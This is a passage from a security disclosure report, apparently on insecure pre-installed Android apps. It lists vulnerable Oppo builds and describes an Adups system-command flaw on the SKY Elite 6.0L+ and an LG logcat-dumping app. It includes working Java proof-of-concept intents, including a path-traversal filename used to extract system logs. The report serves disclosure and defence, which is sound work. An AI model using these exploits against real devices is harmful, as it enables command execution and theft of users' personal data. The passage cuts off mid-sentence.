Table 6. Oppo Vulnerability Timeline for Command Execution as system user. 
Device 
Country 
Status 
Build Description 
R7 Plus 
China 
Not 
Vulnerable 
full_oppo6795_15019-user 5.0 LRX21M 1465722913 dev-
keys 
R7S 
China 
Vulnerable 
msm8916_64-user 5.1.1 LMY47V eng.root.20160713.211744 
dev-keys 
Neo 5 
Australia 
Not 
Vulnerable 
OPPO82_15066-user 4.4.2 KOT49H eng.root.1469846786 
dev-key 
R7 Plus 
India 
Not 
Vulnerable 
msm8916_64-user 5.1.1 LMY47V eng.root.20160922.193102 
dev-keys 
A37 
India 
Vulnerable 
msm8916_64-user 5.1.1 LMY47V eng.root.20171008.172519 
release-keys 
F1S 
Australia 
Vulnerable 
full_oppo6750_15331-user 5.1 LMY47I 1509712532 
release-keys 
F5 
Malaysia 
Vulnerable 
full_oppo6763_17031-user 7.1.1 N6F26Q 1516160348 
release-keys 
R9 
Australia 
Vulnerable 
full_oppo6755_15311-user 5.1 LMY47I 1516344361 
release-keys 
F3 
Pakistan 
Vulnerable 
full_oppo6750_16391-user 6.0 MRA58K 1517824690 
release-keys 
F3 
Vietnam 
Vulnerable 
full_oppo6750_16391-user 6.0 MRA58K 1517824690 
release-keys 
A77 
Australia 
Vulnerable 
full_oppo6750_16391-user 6.0 MRA58K 1517824690 
release-keys 
20 http://bbs.coloros.com/forum.php?mod=phones&code=download 
21 https://oppo-au.custhelp.com/app/soft_update 
22 https://forum.xda-developers.com/android/software/cofface-oppo-ozip2zip-tool-t3653052 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
R9 
China 
Vulnerable 
full_oppo6755_15111-user 5.1 LMY47I 1519426429 dev-
keys 
A39 
Australia 
Vulnerable 
full_oppo6750_16321-user 5.1 LMY47I 1520521221 
release-keys 
F3 Plus 
Pakistan 
Vulnerable 
msm8952_64-user 6.0.1 MMB29M eng.root.20180413.004413 
release-keys 
R11 
China 
Vulnerable 
sdm660_64-user 7.1.1 NMF26X eng.root.20180426.130343 
release-keys 
A57 
Philippines 
Vulnerable 
msm8937_64-user 6.0.1 MMB29M eng.root.20180508.104025 
release-keys 
A59S 
China 
Vulnerable 
full_oppo6750_15131-user 5.1 LMY47I 1525865236 dev-
keys 
A77 
China 
Vulnerable 
msm8953_64-user 7.1.1 NMF26F eng.root.20180609.153403 
dev-keys 
4.6 SKY Elite 6.0L+ Arbitrary Command Execution as the system User 
The SKY Elite 6.0L+ device contains an app with a package name of com.fw.upgrade.sysoper 
(versionCode=238, versionName=2.3.8) that allows any app co-located on the device to have it execute 
commands as the system user. This app was developed by Adups, which is the same company that we 
discovered was surreptitiously exfiltrating PII to China23. This vulnerability is the same one that we 
previously discovered, but the notable thing is that this device was purchased in March, 2018 from Micro 
Center in Fairfax, VA. We examined the two Adups apps on the device (com.fw.upgrade.sysoper and 
com.fw.upgrade) and neither of them exfiltrated any user PII. Although Adups apps are on the device, 
they do not make any network connections. The device uses a platform app with a package name of 
com.android.ota (versionCode=1, versionName=1.0) to check for firmware updates. This app checks 
to see if a firmware update is available right after the boot process completes by making an HTTP GET 
request to the following URL: http://ota.wheatek.com:8001/WtkOTA/CheckUpdate (querystring omitted). 
We witnessed that since May 23, 2018, any requests to this URL time out. If there was a firmware update 
available, the com.android.ota app would use a platform app with a package name of 
com.mediatek.systemupdate.sysoper (versionCode=1, versionName=1.0) to boot into recovery and 
install the firmware update. Since the Wheatek server is not responding to the GET requests, it appears that 
this device will be left with a known vulnerability. The SKY Elite 6.0L+ device has a build fingerprint of 
SKY/x6069_trx_l601_sky/x6069_trx_l601_sky:6.0/MRA58K/1482897127:user/release-keys. 
This device has a build date of Wed Dec 28 12:01:22 CST 2016 according to the ro.build.date system 
property. Adups has fixed the arbitrary command execution as system user vulnerability in its apps, 
although SKY or another entity in the supply chain included an old version of the Adups app in their build 
that has not been updated, making the device vulnerable. The source code below will cause the 
com.fw.upgrade.sysoper app to create a file an empty file with a path of /sdcard/f.txt. This is a fairly 
benign command to be executed as it just shows the vulnerable app will actually execute commands of the 
attacking app’s choosing and can be replaced with a different command.  
Intent i = new Intent("android.intent.action.Fota.OperReceiver"); 
i.setClassName("com.fw.upgrade.sysoper", "com.adups.fota.sysoper.WriteCommandReceiver"); 
i.putExtra("cmd", "touch /sdcard/f.txt"); 
sendBroadcast(i); 
23 https://www.blackhat.com/docs/us-17/wednesday/us-17-Johnson-All-Your-SMS-&-Contacts-Belong-To-Adups-&-
Others.pdf 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
5. Logcat Logs 
The logcat logs consist of four different log buffers: system, main, radio, and events24. The logcat log is a 
shared resource where any process on the device can write a message to the log. The logcat log is generally 
for debugging purposes. A third-party app can only read log messages that the app itself has written. Pre-
installed apps can request and be granted the READ_LOGS permission by the Android OS. The Android OS 
and apps can write sensitive data to the logs, so the capability to read from the system-wide logcat log was 
taken away from third-party apps in Android 4.1. Since a third-party app cannot directly obtain the system-
wide logcat log, a third-party app may leverage another privileged app to write the system-wide logcat logs 
to the SD card or potentially its own private app directory. We found various vulnerabilities where a 
privileged pre-installed app writes the logcat logs to the SD card25.  
The logcat logs tend to contain email addresses, telephone numbers, GPS coordinates, unique device 
identifiers, and arbitrary messages written by any process on the device. A non-exhaustive list of concrete 
logcat log messages is provided in Appendix B. The log messages in Appendix B are from the ZTE Blade 
Vantage 
device 
from 
Verizon 
with 
a 
build 
fingerprint 
of 
ZTE/Z839/sweet:7.1.1/NMF26V/20180120.095344:user/release-keys. App developers may write 
sensitive data to the logcat log while under the impression that their messages will be private and 
unobtainable. Information disclosure from the logcat log can be damaging depending on the nature of the 
data written to the log. Appendix B contains a username and password pair being written to the logcat log 
from a US Fortune 500 bank app. There is some variance of the data that is written to the logcat log among 
different Android devices. Some older examples of data written to the logcat log can be found here26. 
5.1 Various LG Devices – Getting the Logcat Logs Written to an App’s Private Directory 
The com.lge.gnsslogcat app (versionCode=1, versionName=1.0) is present as a pre-installed app on 
the four LG devices we examined, show below with their corresponding build fingerprints. 
LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys 
LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys 
LG X Power - lge/k6p_usc_us/k6p:6.0.1/MXB48T/171491459f52c:user/release-keys 
LG Phoenix 2 - lge/m1v_att_us/m1v:6.0/MRA58K/1627312504f12:user/release-keys  
This platform app executes as the system user since the app is signed with the platform key and sets the 
android:sharedUserId attribute to a value of android.uid.system in its AndroidManifest.xml file. 
This provides the application with significant capabilities on the device. The app also requests the 
android.permission.READ_LOGS permission. As this app is installed on the system partition, the 
READ_LOGS permission will be granted to it so that it can read the system-wide logcat log. The 
AndroidManifest.xml file of the com.lge.gnsslogcat app is provided below. 
The com.lge.gnsslogcat app is small, as it only contains three classes for the whole app and only contains 
a single service application component: GnssLogService. This component is explicitly exported as it sets 
the android:exported attribute to a value of true. The com.lge.gnsslogcat app does not run following 
device startup and will only run when started by another app on the device. When the com.lge.gnsslogcat 
app is started via an intent, it will write the logcat log to external storage, although the log messages it writes 
belong to a limited set of log tags. Each log entry has a log tag and a log message. Specifically, the default 
configuration for the com.lge.gnsslogcat app is to only record log messages that have a log tag of 
GpsLocationProvider, LocationManagerService, or GnssLogService. Under the default configuration, 
the com.lge.gnsslogcat app writes the entire log entries for log messages from the system-wide logcat 
log that have the aforementioned log tags to a default path of /sdcard/gnsslog/GnssLogService.log. 
An example listing of this file is shown below. 
05-10 13:16:24.559  1703  2555 D LocationManagerService: getLastLocation: 
Request[ACCURACY_FINE gps requested=0 fastest=0 num=1] 
05-10 13:16:24.560  1703  1717 D LocationManagerService: getLastLocation: Request[POWER_LOW 
network requested=0 fastest=0 num=1] 
05-10 13:16:39.131  6668  6685 D GnssLogService: FileName[GnssLogService] start logging 
05-10 13:17:34.930  1703  3307 D LocationManagerService: getLastLocation: Request[POWER_NONE 
passive fastest=0 num=1] 
05-10 13:17:34.940  1703  3345 D LocationManagerService: getLastLocation: Request[POWER_NONE 
passive fastest=0 num=1] 
05-10 13:17:34.949  1703  3307 D LocationManagerService: getLastLocation: Request[POWER_NONE 
passive fastest=0 num=1] 
The logcat log, containing only log entries from 3 specific log tags, only provides a very limited amount of 
data. We discovered a method to provide input to the com.lge.gnsslogcat app so that the entire system-
wide logcat log will be written to the output file. The attacking app that starts the com.lge.gnsslogcat 
app externally can control the path where the file will be created. Moreover, the attacker can use a path 
traversal attack. The resulting log file will always have a fixed .log extension, but the path can be controlled 
by the attacker. The path selection will still be subject to SELinux rules. We have found that the attacking 
app can successfully cause the com.lge.gnsslogcat app create a logcat log file in the attacking app’s 
private directory. Therefore, the attacking app does not require any permissions to obtain the logcat logs, 
although if data from the logcat log is to be sent off from the device, the attacking app will need the 
INTERNET permission. 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Here we provide the source code to perform the attack using a notional package name of hab.huba. The 
first thing the attacking app needs to do is to make its private directory (i.e., /data/data/hab.huba) 
globally executable. This source code below will accomplish this.  
File baseAppDir = getFilesDir().getParentFile(); 
baseAppDir.setExecutable(true, false); 
After that, the attacking app needs to create a file in its private directory. The name can be anything although 
it will have to end in .log and the same file name (except the .log since it will be appended by the 
com.lge.gnsslogcat app) will need to be used when sending an intent to the com.lge.gnsslogcat app 
to start the logging. Using an example file name of test.txt.log, we will create it in the attacking app’s 
private directory.  
File logfile = new File(baseAppDir, "test.txt.log"); 
try { 
    logfile.createNewFile(); 
    logfile.setWritable(true, false); 
} catch (IOException e) { 
    e.printStackTrace(); 
} 
This code will create an empty file in the attacking app’s private directory that will be writable by the 
com.lge.gnsslogcat app. The SELinux rules on the device allow the com.lge.gnsslogcat app to write  
from a third-party app’s private directory. The attacking app, hab.huba, will be the owner of the 
test.txt.log file even after the com.lge.gnsslogcat app writes logcat log data to it. Below is the code 
the attacking app will execute to initiate the writing of the logcat log file in its private directory to a file of 
its choosing. 
Intent i = new Intent("com.lge.gnsslogcat"); 
i.setClassName("com.lge.gnsslogcat", "com.lge.gnsslogcat.GnssLogService"); 
i.putExtra("modulename", "GnssLogService"); 
i.putExtra("start", true); 
i.putExtra("logfilename", "../../../../data/data/hab.huba/test.txt"); 
ArrayList darkness = new ArrayList(); 
darkness.add("*:V Hidden"); 
i.putStringArrayListExtra("tags", darkness); 
startService(i); 
The logfilename extra used in the intent controls the file name, but it can also be used to control the file 